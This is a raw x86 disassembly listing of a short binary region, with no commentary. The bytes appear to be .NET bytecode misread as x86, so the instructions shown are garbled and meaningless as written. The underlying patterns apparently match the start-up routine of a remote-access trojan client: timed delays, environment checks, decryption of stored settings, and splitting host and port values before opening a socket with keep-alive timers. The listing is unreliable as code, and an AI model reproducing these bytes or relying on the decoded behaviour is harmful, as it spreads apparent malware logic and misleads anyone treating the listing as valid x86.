  4025cc:	00 00                	add    %al,(%eax)
  4025ce:	0a 80 3b 00 00 04    	or     0x400003b(%eax),%al
  4025d4:	2a 5e 02             	sub    0x2(%esi),%bl
  4025d7:	28 1b                	sub    %bl,(%ebx)
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	0a 03                	or     (%ebx),%al
  4025dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4025de:	21 00                	and    %eax,(%eax)
  4025e0:	00 0a                	add    %cl,(%edx)
  4025e2:	28 99 00 00 06 28    	sub    %bl,0x28060000(%ecx)
  4025e8:	fb                   	sti
  4025e9:	00 00                	add    %al,(%eax)
  4025eb:	0a 2a                	or     (%edx),%ch
  4025ed:	5e                   	pop    %esi
  4025ee:	28 1b                	sub    %bl,(%ebx)
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	0a 02                	or     (%edx),%al
  4025f4:	03 28                	add    (%eax),%ebp
  4025f6:	1c 00                	sbb    $0x0,%al
  4025f8:	00 0a                	add    %cl,(%edx)
  4025fa:	28 9b 00 00 06 6f    	sub    %bl,0x6f060000(%ebx)
  402600:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402605:	62 1f                	bound  %ebx,(%edi)
  402607:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40260d:	25 d0 44 00 00       	and    $0x44d0,%eax
  402612:	04 28                	add    $0x28,%al
  402614:	78 00                	js     0x402616
  402616:	00 0a                	add    %cl,(%edx)
  402618:	80 43 00 00          	addb   $0x0,0x0(%ebx)
  40261c:	04 2a                	add    $0x2a,%al
  40261e:	00 00                	add    %al,(%eax)
  402620:	1b 30                	sbb    (%eax),%esi
  402622:	03 00                	add    (%eax),%eax
  402624:	b5 00                	mov    $0x0,%ch
  402626:	00 00                	add    %al,(%eax)
  402628:	01 00                	add    %eax,(%eax)
  40262a:	00 11                	add    %dl,(%ecx)
  40262c:	16                   	push   %ss
  40262d:	0a 2b                	or     (%ebx),%ch
  40262f:	0e                   	push   %cs
  402630:	20 e8                	and    %ch,%al
  402632:	03 00                	add    (%eax),%eax
  402634:	00 28                	add    %ch,(%eax)
  402636:	14 00                	adc    $0x0,%al
  402638:	00 0a                	add    %cl,(%edx)
  40263a:	06                   	push   %es
  40263b:	17                   	pop    %ss
  40263c:	58                   	pop    %eax
  40263d:	0a 06                	or     (%esi),%al
  40263f:	7e 11                	jle    0x402652
  402641:	00 00                	add    %al,(%eax)
  402643:	04 28                	add    $0x28,%al
  402645:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  40264a:	e5 28                	in     $0x28,%eax
  40264c:	03 00                	add    (%eax),%eax
  40264e:	00 06                	add    %al,(%esi)
  402650:	2d 06 16 28 16       	sub    $0x16281606,%eax
  402655:	00 00                	add    %al,(%eax)
  402657:	0a 00                	or     (%eax),%al
  402659:	28 87 00 00 06 2d    	sub    %al,0x2d060000(%edi)
  40265f:	06                   	push   %es
  402660:	16                   	push   %ss
  402661:	28 16                	sub    %dl,(%esi)
  402663:	00 00                	add    %al,(%eax)
  402665:	0a 7e 0c             	or     0xc(%esi),%bh
  402668:	00 00                	add    %al,(%eax)
  40266a:	04 28                	add    $0x28,%al
  40266c:	17                   	pop    %ss
  40266d:	00 00                	add    %al,(%eax)
  40266f:	0a 2c 05 28 72 00 00 	or     0x7228(,%eax,1),%ch
  402676:	06                   	push   %es
  402677:	7e 04                	jle    0x40267d
  402679:	00 00                	add    %al,(%eax)
  40267b:	04 28                	add    $0x28,%al
  40267d:	17                   	pop    %ss
  40267e:	00 00                	add    %al,(%eax)
  402680:	0a 2c 05 28 70 00 00 	or     0x7028(,%eax,1),%ch
  402687:	06                   	push   %es
  402688:	7e 0f                	jle    0x402699
  40268a:	00 00                	add    %al,(%eax)
  40268c:	04 28                	add    $0x28,%al
  40268e:	17                   	pop    %ss
  40268f:	00 00                	add    %al,(%eax)
  402691:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402694:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  40269a:	05 28 8a 00 00       	add    $0x8a28,%eax
  40269f:	06                   	push   %es
  4026a0:	28 86 00 00 06 73    	sub    %al,0x73060000(%esi)
  4026a6:	7d 00                	jge    0x4026a8
  4026a8:	00 06                	add    %al,(%esi)
  4026aa:	28 7b 00             	sub    %bh,0x0(%ebx)
  4026ad:	00 06                	add    %al,(%esi)
  4026af:	26 de 03             	fiadds %es:(%ebx)
  4026b2:	26 de 00             	fiadds %es:(%eax)
  4026b5:	28 12                	sub    %dl,(%edx)
  4026b7:	00 00                	add    %al,(%eax)
  4026b9:	06                   	push   %es
  4026ba:	2d 0a 28 1c 00       	sub    $0x1c280a,%eax
  4026bf:	00 06                	add    %al,(%esi)
  4026c1:	28 19                	sub    %bl,(%ecx)
  4026c3:	00 00                	add    %al,(%eax)
  4026c5:	06                   	push   %es
  4026c6:	73 18                	jae    0x4026e0
  4026c8:	00 00                	add    %al,(%eax)
  4026ca:	0a 20                	or     (%eax),%ah
  4026cc:	e8 03 00 00 20       	call   0x204026d4
  4026d1:	88 13                	mov    %dl,(%ebx)
  4026d3:	00 00                	add    %al,(%eax)
  4026d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d6:	19 00                	sbb    %eax,(%eax)
  4026d8:	00 0a                	add    %cl,(%edx)
  4026da:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026dd:	00 0a                	add    %cl,(%edx)
  4026df:	2b d4                	sub    %esp,%edx
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	00 01                	add    %al,(%ecx)
  4026e5:	10 00                	adc    %al,(%eax)
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	00 2d 00 59 86 00    	add    %ch,0x865900
  4026ef:	03 01                	add    (%ecx),%eax
  4026f1:	00 00                	add    %al,(%eax)
  4026f3:	01 1b                	add    %ebx,(%ebx)
  4026f5:	30 02                	xor    %al,(%edx)
  4026f7:	00 13                	add    %dl,(%ebx)
  4026f9:	01 00                	add    %eax,(%eax)
  4026fb:	00 02                	add    %al,(%edx)
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	11 28                	adc    %ebp,(%eax)
  402701:	1b 00                	sbb    (%eax),%eax
  402703:	00 0a                	add    %cl,(%edx)
  402705:	7e 07                	jle    0x40270e
  402707:	00 00                	add    %al,(%eax)
  402709:	04 28                	add    $0x28,%al
  40270b:	1c 00                	sbb    $0x0,%al
  40270d:	00 0a                	add    %cl,(%edx)
  40270f:	6f                   	outsl  %ds:(%esi),(%dx)
  402710:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  402715:	07                   	pop    %es
  402716:	00 00                	add    %al,(%eax)
  402718:	04 7e                	add    $0x7e,%al
  40271a:	07                   	pop    %es
  40271b:	00 00                	add    %al,(%eax)
  40271d:	04 73                	add    $0x73,%al
  40271f:	97                   	xchg   %eax,%edi
  402720:	00 00                	add    %al,(%eax)
  402722:	06                   	push   %es
  402723:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272a:	00 00                	add    %al,(%eax)
  40272c:	04 7e                	add    $0x7e,%al
  40272e:	01 00                	add    %eax,(%eax)
  402730:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402733:	9a 00 00 06 80 01 00 	lcall  $0x1,$0x80060000
  40273a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40273d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402742:	02 00                	add    (%eax),%al
  402744:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402747:	9a 00 00 06 80 02 00 	lcall  $0x2,$0x80060000
  40274e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402751:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402756:	03 00                	add    (%eax),%eax
  402758:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275b:	9a 00 00 06 80 03 00 	lcall  $0x3,$0x80060000
  402762:	00 04 7e             	add    %al,(%esi,%edi,2)
  402765:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276a:	04 00                	add    $0x0,%al
  40276c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40276f:	9a 00 00 06 80 04 00 	lcall  $0x4,$0x80060000
  402776:	00 04 7e             	add    %al,(%esi,%edi,2)
  402779:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40277e:	08 00                	or     %al,(%eax)
  402780:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402783:	9a 00 00 06 80 08 00 	lcall  $0x8,$0x80060000
  40278a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40278d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402792:	0e                   	push   %cs
  402793:	00 00                	add    %al,(%eax)
  402795:	04 6f                	add    $0x6f,%al
  402797:	9a 00 00 06 80 0e 00 	lcall  $0xe,$0x80060000
  40279e:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a1:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027a6:	0c 00                	or     $0x0,%al
  4027a8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027ab:	9a 00 00 06 80 0c 00 	lcall  $0xc,$0x80060000
  4027b2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027b5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ba:	0f 00 00             	sldt   (%eax)
  4027bd:	04 6f                	add    $0x6f,%al
  4027bf:	9a 00 00 06 80 0f 00 	lcall  $0xf,$0x80060000
  4027c6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027c9:	7e 00                	jle    0x4027cb
  4027cb:	00 06                	add    %al,(%esi)
  4027cd:	80 10 00             	adcb   $0x0,(%eax)
  4027d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027d3:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d8:	0a 00                	or     (%eax),%al
  4027da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027dd:	9a 00 00 06 80 0a 00 	lcall  $0xa,$0x80060000
  4027e4:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027e7:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ec:	09 00                	or     %eax,(%eax)
  4027ee:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f1:	9a 00 00 06 28 1c 00 	lcall  $0x1c,$0x28060000
  4027f8:	00 0a                	add    %cl,(%edx)
  4027fa:	73 1e                	jae    0x40281a
  4027fc:	00 00                	add    %al,(%eax)
  4027fe:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  402804:	28 04 00             	sub    %al,(%eax,%eax,1)
  402807:	00 06                	add    %al,(%esi)
  402809:	0a de                	or     %dh,%bl
  40280b:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402810:	00 06                	add    %al,(%esi)
  402812:	2a 00                	sub    (%eax),%al
  402814:	41                   	inc    %ecx
  402815:	1c 00                	sbb    $0x0,%al
	...
  40281f:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  402822:	00 00                	add    %al,(%eax)
  402824:	0c 01                	or     $0x1,%al
  402826:	00 00                	add    %al,(%eax)
  402828:	05 00 00 00 01       	add    $0x1000000,%eax
  40282d:	00 00                	add    %al,(%eax)
  40282f:	01 1b                	add    %ebx,(%ebx)
  402831:	30 04 00             	xor    %al,(%eax,%eax,1)
  402834:	4b                   	dec    %ebx
  402835:	00 00                	add    %al,(%eax)
  402837:	00 02                	add    %al,(%edx)
  402839:	00 00                	add    %al,(%eax)
  40283b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40283e:	00 00                	add    %al,(%eax)
  402840:	04 6f                	add    $0x6f,%al
  402842:	1f                   	pop    %ds
  402843:	00 00                	add    %al,(%eax)
  402845:	0a 6f 20             	or     0x20(%edi),%ch
  402848:	00 00                	add    %al,(%eax)
  40284a:	0a 74 30 00          	or     0x0(%eax,%esi,1),%dh
  40284e:	00 01                	add    %al,(%ecx)
  402850:	28 1b                	sub    %bl,(%ebx)
  402852:	00 00                	add    %al,(%eax)
  402854:	0a 7e 07             	or     0x7(%esi),%bh
  402857:	00 00                	add    %al,(%eax)
  402859:	04 6f                	add    $0x6f,%al
  40285b:	21 00                	and    %eax,(%eax)
  40285d:	00 0a                	add    %cl,(%edx)
  40285f:	28 9f 00 00 06 72    	sub    %bl,0x72060000(%edi)
  402865:	01 00                	add    %eax,(%eax)
  402867:	00 70 28             	add    %dh,0x28(%eax)
  40286a:	22 00                	and    (%eax),%al
  40286c:	00 0a                	add    %cl,(%edx)
  40286e:	7e 0a                	jle    0x40287a
  402870:	00 00                	add    %al,(%eax)
  402872:	04 28                	add    $0x28,%al
  402874:	1c 00                	sbb    $0x0,%al
  402876:	00 0a                	add    %cl,(%edx)
  402878:	6f                   	outsl  %ds:(%esi),(%dx)
  402879:	23 00                	and    (%eax),%eax
  40287b:	00 0a                	add    %cl,(%edx)
  40287d:	0a de                	or     %dh,%bl
  40287f:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402884:	00 06                	add    %al,(%esi)
  402886:	2a 00                	sub    (%eax),%al
  402888:	01 10                	add    %edx,(%eax)
  40288a:	00 00                	add    %al,(%eax)
  40288c:	00 00                	add    %al,(%eax)
  40288e:	00 00                	add    %al,(%eax)
  402890:	44                   	inc    %esp
  402891:	44                   	inc    %esp
  402892:	00 05 32 00 00 01    	add    %al,0x1000032
  402898:	13 30                	adc    (%eax),%esi
  40289a:	01 00                	add    %eax,(%eax)
  40289c:	97                   	xchg   %eax,%edi
  40289d:	00 00                	add    %al,(%eax)
  40289f:	00 00                	add    %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	00 72 0f             	add    %dh,0xf(%edx)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	70 80                	jo     0x40282a
  4028aa:	01 00                	add    %eax,(%eax)
  4028ac:	00 04 72             	add    %al,(%edx,%esi,2)
  4028af:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028b6:	00 04 72             	add    %al,(%edx,%esi,2)
  4028b9:	ed                   	in     (%dx),%eax
  4028ba:	01 00                	add    %eax,(%eax)
  4028bc:	70 80                	jo     0x40283e
  4028be:	03 00                	add    (%eax),%eax
  4028c0:	00 04 72             	add    %al,(%edx,%esi,2)
  4028c3:	a0 02 00 70 80       	mov    0x80700002,%al
  4028c8:	04 00                	add    $0x0,%al
  4028ca:	00 04 72             	add    %al,(%edx,%esi,2)
  4028cd:	53                   	push   %ebx
  4028ce:	03 00                	add    (%eax),%eax
  4028d0:	70 80                	jo     0x402852
  4028d2:	05 00 00 04 72       	add    $0x72040000,%eax
  4028d7:	67 03 00             	add    (%bx,%si),%eax
  4028da:	70 80                	jo     0x40285c
  4028dc:	06                   	push   %es
  4028dd:	00 00                	add    %al,(%eax)
  4028df:	04 72                	add    $0x72,%al
  4028e1:	89 03                	mov    %eax,(%ebx)
  4028e3:	00 70 80             	add    %dh,-0x80(%eax)
  4028e6:	07                   	pop    %es
  4028e7:	00 00                	add    %al,(%eax)
  4028e9:	04 72                	add    $0x72,%al
  4028eb:	e3 03                	jecxz  0x4028f0
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	08 00                	or     %al,(%eax)
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	96                   	xchg   %eax,%esi
  4028f6:	04 00                	add    $0x0,%al
  4028f8:	70 80                	jo     0x40287a
  4028fa:	09 00                	or     %eax,(%eax)
  4028fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4028ff:	f1                   	int1
  402900:	16                   	push   %ss
  402901:	00 70 80             	add    %dh,-0x80(%eax)
  402904:	0a 00                	or     (%eax),%al
  402906:	00 04 72             	add    %al,(%edx,%esi,2)
  402909:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40290a:	1e                   	push   %ds
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	0c 00                	or     $0x0,%al
  402910:	00 04 72             	add    %al,(%edx,%esi,2)
  402913:	57                   	push   %edi
  402914:	1f                   	pop    %ds
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	0e                   	push   %cs
  402919:	00 00                	add    %al,(%eax)
  40291b:	04 72                	add    $0x72,%al
  40291d:	0a 20                	or     (%eax),%ah
  40291f:	00 70 80             	add    %dh,-0x80(%eax)
  402922:	0f 00 00             	sldt   (%eax)
  402925:	04 72                	add    $0x72,%al
  402927:	bd 20 00 70 80       	mov    $0x80700020,%ebp
  40292c:	10 00                	adc    %al,(%eax)
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	bf 20 00 70 80       	mov    $0x80700020,%edi
  402936:	11 00                	adc    %eax,(%eax)
  402938:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40293b:	00 1b                	add    %bl,(%ebx)
  40293d:	30 07                	xor    %al,(%edi)
  40293f:	00 9e 02 00 00 03    	add    %bl,0x3000002(%esi)
  402945:	00 00                	add    %al,(%eax)
  402947:	11 18                	adc    %ebx,(%eax)
  402949:	17                   	pop    %ss
  40294a:	1c 73                	sbb    $0x73,%al
  40294c:	24 00                	and    $0x0,%al
  40294e:	00 0a                	add    %cl,(%edx)
  402950:	25 20 00 c8 00       	and    $0xc80020,%eax
  402955:	00 6f 25             	add    %ch,0x25(%edi)
  402958:	00 00                	add    %al,(%eax)
  40295a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402960:	00 6f 26             	add    %ch,0x26(%edi)
  402963:	00 00                	add    %al,(%eax)
  402965:	0a 28                	or     (%eax),%ch
  402967:	07                   	pop    %es
  402968:	00 00                	add    %al,(%eax)
  40296a:	06                   	push   %es
  40296b:	7e 0e                	jle    0x40297b
  40296d:	00 00                	add    %al,(%eax)
  40296f:	04 72                	add    $0x72,%al
  402971:	c3                   	ret
  402972:	20 00                	and    %al,(%eax)
  402974:	70 28                	jo     0x40299e
  402976:	27                   	daa
  402977:	00 00                	add    %al,(%eax)
  402979:	0a 39                	or     (%ecx),%bh
  40297b:	d0 00                	rolb   $1,(%eax)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	7e 02                	jle    0x402983
  402981:	00 00                	add    %al,(%eax)
  402983:	04 17                	add    $0x17,%al
  402985:	8d 3a                	lea    (%edx),%edi
  402987:	00 00                	add    %al,(%eax)
  402989:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  40298f:	6f                   	outsl  %ds:(%esi),(%dx)
  402990:	28 00                	sub    %al,(%eax)
  402992:	00 0a                	add    %cl,(%edx)
  402994:	73 18                	jae    0x4029ae
  402996:	00 00                	add    %al,(%eax)
  402998:	0a 7e 02             	or     0x2(%esi),%bh
  40299b:	00 00                	add    %al,(%eax)
  40299d:	04 17                	add    $0x17,%al
  40299f:	8d 3a                	lea    (%edx),%edi
  4029a1:	00 00                	add    %al,(%eax)
  4029a3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029aa:	28 00                	sub    %al,(%eax)
  4029ac:	00 0a                	add    %cl,(%edx)
  4029ae:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029b1:	29 00                	sub    %eax,(%eax)
  4029b3:	00 0a                	add    %cl,(%edx)
  4029b5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029bc:	17                   	pop    %ss
  4029bd:	8d 3a                	lea    (%edx),%edi
  4029bf:	00 00                	add    %al,(%eax)
  4029c1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c8:	28 00                	sub    %al,(%eax)
  4029ca:	00 0a                	add    %cl,(%edx)
  4029cc:	73 18                	jae    0x4029e6
  4029ce:	00 00                	add    %al,(%eax)
  4029d0:	0a 7e 01             	or     0x1(%esi),%bh
  4029d3:	00 00                	add    %al,(%eax)
  4029d5:	04 17                	add    $0x17,%al
  4029d7:	8d 3a                	lea    (%edx),%edi
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e2:	28 00                	sub    %al,(%eax)
  4029e4:	00 0a                	add    %cl,(%edx)
  4029e6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029e9:	29 00                	sub    %eax,(%eax)
  4029eb:	00 0a                	add    %cl,(%edx)
  4029ed:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  4029f4:	06                   	push   %es
  4029f5:	28 1a                	sub    %bl,(%edx)
  4029f7:	00 00                	add    %al,(%eax)
  4029f9:	06                   	push   %es
  4029fa:	2c 42                	sub    $0x42,%al
  4029fc:	06                   	push   %es
  4029fd:	28 2a                	sub    %ch,(%edx)
  4029ff:	00 00                	add    %al,(%eax)
  402a01:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a04:	0d 2b 2c 08 09       	or     $0x9082c2b,%eax
  402a09:	9a 13 04 28 06 00 00 	lcall  $0x0,$0x6280413
  402a10:	06                   	push   %es
  402a11:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a14:	6f                   	outsl  %ds:(%esi),(%dx)
  402a15:	2b 00                	sub    (%eax),%eax
  402a17:	00 0a                	add    %cl,(%edx)
  402a19:	28 06                	sub    %al,(%esi)
  402a1b:	00 00                	add    %al,(%eax)
  402a1d:	06                   	push   %es
  402a1e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a1f:	2c 00                	sub    $0x0,%al
  402a21:	00 0a                	add    %cl,(%edx)
  402a23:	2c 05                	sub    $0x5,%al
  402a25:	dd af 00 00 00 de    	(bad) -0x22000000(%edi)
  402a2b:	03 26                	add    (%esi),%esp
  402a2d:	de 00                	fiadds (%eax)
  402a2f:	09 17                	or     %edx,(%edi)
  402a31:	58                   	pop    %eax
  402a32:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a37:	32 ce                	xor    %dh,%cl
  402a39:	38 9b 00 00 00 28    	cmp    %bl,0x28000000(%ebx)
  402a3f:	06                   	push   %es
  402a40:	00 00                	add    %al,(%eax)
  402a42:	06                   	push   %es
  402a43:	06                   	push   %es
  402a44:	07                   	pop    %es
  402a45:	6f                   	outsl  %ds:(%esi),(%dx)
  402a46:	2d 00 00 0a 38       	sub    $0x380a0000,%eax
  402a4b:	8a 00                	mov    (%eax),%al
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	73 2e                	jae    0x402a7f
  402a51:	00 00                	add    %al,(%eax)
  402a53:	0a 13                	or     (%ebx),%dl
  402a55:	05 72 bd 20 00       	add    $0x20bd72,%eax
  402a5a:	70 72                	jo     0x402ace
  402a5c:	bd 20 00 70 73       	mov    $0x73700020,%ebp
  402a61:	2f                   	das
  402a62:	00 00                	add    %al,(%eax)
  402a64:	0a 13                	or     (%ebx),%dl
  402a66:	06                   	push   %es
  402a67:	11 05 11 06 6f 30    	adc    %eax,0x306f0611
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	0a 11                	or     (%ecx),%dl
  402a71:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402a76:	04 6f                	add    $0x6f,%al
  402a78:	31 00                	xor    %eax,(%eax)
  402a7a:	00 0a                	add    %cl,(%edx)
  402a7c:	17                   	pop    %ss
  402a7d:	8d 39                	lea    (%ecx),%edi
  402a7f:	00 00                	add    %al,(%eax)
  402a81:	01 25 16 72 cd 20    	add    %esp,0x20cd7216
  402a87:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a8a:	16                   	push   %ss
  402a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a8c:	32 00                	xor    (%eax),%al
  402a8e:	00 0a                	add    %cl,(%edx)
  402a90:	13 07                	adc    (%edi),%eax
  402a92:	11 07                	adc    %eax,(%edi)
  402a94:	16                   	push   %ss
  402a95:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  402a9c:	07                   	pop    %es
  402a9d:	73 18                	jae    0x402ab7
  402a9f:	00 00                	add    %al,(%eax)
  402aa1:	0a 17                	or     (%edi),%dl
  402aa3:	11 07                	adc    %eax,(%edi)
  402aa5:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aa8:	19 00                	sbb    %eax,(%eax)
  402aaa:	00 0a                	add    %cl,(%edx)
  402aac:	9a 80 01 00 00 04 28 	lcall  $0x2804,$0x180
  402ab3:	06                   	push   %es
  402ab4:	00 00                	add    %al,(%eax)
  402ab6:	06                   	push   %es
  402ab7:	7e 02                	jle    0x402abb
  402ab9:	00 00                	add    %al,(%eax)
  402abb:	04 7e                	add    $0x7e,%al
  402abd:	01 00                	add    %eax,(%eax)
  402abf:	00 04 28             	add    %al,(%eax,%ebp,1)
  402ac2:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402ac7:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402acc:	0c 11                	or     $0x11,%al
  402ace:	05 2c 07 11 05       	add    $0x511072c,%eax
  402ad3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ad4:	33 00                	xor    (%eax),%eax
  402ad6:	00 0a                	add    %cl,(%edx)
  402ad8:	dc 28                	fsubrl (%eax)
  402ada:	06                   	push   %es
  402adb:	00 00                	add    %al,(%eax)
  402add:	06                   	push   %es
  402ade:	6f                   	outsl  %ds:(%esi),(%dx)
  402adf:	2c 00                	sub    $0x0,%al
  402ae1:	00 0a                	add    %cl,(%edx)
  402ae3:	39 ec                	cmp    %ebp,%esp
  402ae5:	00 00                	add    %al,(%eax)
  402ae7:	00 17                	add    %dl,(%edi)
  402ae9:	28 13                	sub    %dl,(%ebx)
  402aeb:	00 00                	add    %al,(%eax)
  402aed:	06                   	push   %es
  402aee:	28 06                	sub    %al,(%esi)
  402af0:	00 00                	add    %al,(%eax)
  402af2:	06                   	push   %es
  402af3:	17                   	pop    %ss
  402af4:	73 34                	jae    0x402b2a
  402af6:	00 00                	add    %al,(%eax)
  402af8:	0a 16                	or     (%esi),%dl
  402afa:	14 fe                	adc    $0xfe,%al
  402afc:	06                   	push   %es
  402afd:	1b 00                	sbb    (%eax),%eax
  402aff:	00 06                	add    %al,(%esi)
  402b01:	73 35                	jae    0x402b38
  402b03:	00 00                	add    %al,(%eax)
  402b05:	0a 73 36             	or     0x36(%ebx),%dh
  402b08:	00 00                	add    %al,(%eax)
  402b0a:	0a 28                	or     (%eax),%ch
  402b0c:	09 00                	or     %eax,(%eax)
  402b0e:	00 06                	add    %al,(%esi)
  402b10:	28 08                	sub    %cl,(%eax)
  402b12:	00 00                	add    %al,(%eax)
  402b14:	06                   	push   %es
  402b15:	28 06                	sub    %al,(%esi)
  402b17:	00 00                	add    %al,(%eax)
  402b19:	06                   	push   %es
  402b1a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1b:	37                   	aaa
  402b1c:	00 00                	add    %al,(%eax)
  402b1e:	0a 6f 38             	or     0x38(%edi),%ch
  402b21:	00 00                	add    %al,(%eax)
  402b23:	0a 17                	or     (%edi),%dl
  402b25:	8d 3a                	lea    (%edx),%edi
  402b27:	00 00                	add    %al,(%eax)
  402b29:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	28 00                	sub    %al,(%eax)
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	16                   	push   %ss
  402b35:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402b3c:	16                   	push   %ss
  402b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3e:	39 00                	cmp    %eax,(%eax)
  402b40:	00 0a                	add    %cl,(%edx)
  402b42:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b45:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b4a:	0c 00                	or     $0x0,%al
  402b4c:	00 06                	add    %al,(%esi)
  402b4e:	d4 8d                	aam    $0x8d
  402b50:	44                   	inc    %esp
  402b51:	00 00                	add    %al,(%eax)
  402b53:	01 28                	add    %ebp,(%eax)
  402b55:	0b 00                	or     (%eax),%eax
  402b57:	00 06                	add    %al,(%esi)
  402b59:	16                   	push   %ss
  402b5a:	6a 28                	push   $0x28
  402b5c:	0f 00 00             	sldt   (%eax)
  402b5f:	06                   	push   %es
  402b60:	28 80 00 00 06 28    	sub    %al,0x28060000(%eax)
  402b66:	1e                   	push   %ds
  402b67:	00 00                	add    %al,(%eax)
  402b69:	06                   	push   %es
  402b6a:	14 fe                	adc    $0xfe,%al
  402b6c:	06                   	push   %es
  402b6d:	1f                   	pop    %ds
  402b6e:	00 00                	add    %al,(%eax)
  402b70:	06                   	push   %es
  402b71:	73 3a                	jae    0x402bad
  402b73:	00 00                	add    %al,(%eax)
  402b75:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402b78:	18 00                	sbb    %al,(%eax)
  402b7a:	00 0a                	add    %cl,(%edx)
  402b7c:	20 98 3a 00 00 20    	and    %bl,0x2000003a(%eax)
  402b82:	30 75 00             	xor    %dh,0x0(%ebp)
  402b85:	00 6f 19             	add    %ch,0x19(%edi)
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	0a 73 18             	or     0x18(%ebx),%dh
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	0a 20                	or     (%eax),%ah
  402b91:	98                   	cwtl
  402b92:	3a 00                	cmp    (%eax),%al
  402b94:	00 20                	add    %ah,(%eax)
  402b96:	60                   	pusha
  402b97:	ea 00 00 6f 19 00 00 	ljmp   $0x0,$0x196f0000
  402b9e:	0a 73 3b             	or     0x3b(%ebx),%dh
  402ba1:	00 00                	add    %al,(%eax)
  402ba3:	0a 28                	or     (%eax),%ch
  402ba5:	11 00                	adc    %eax,(%eax)
  402ba7:	00 06                	add    %al,(%esi)
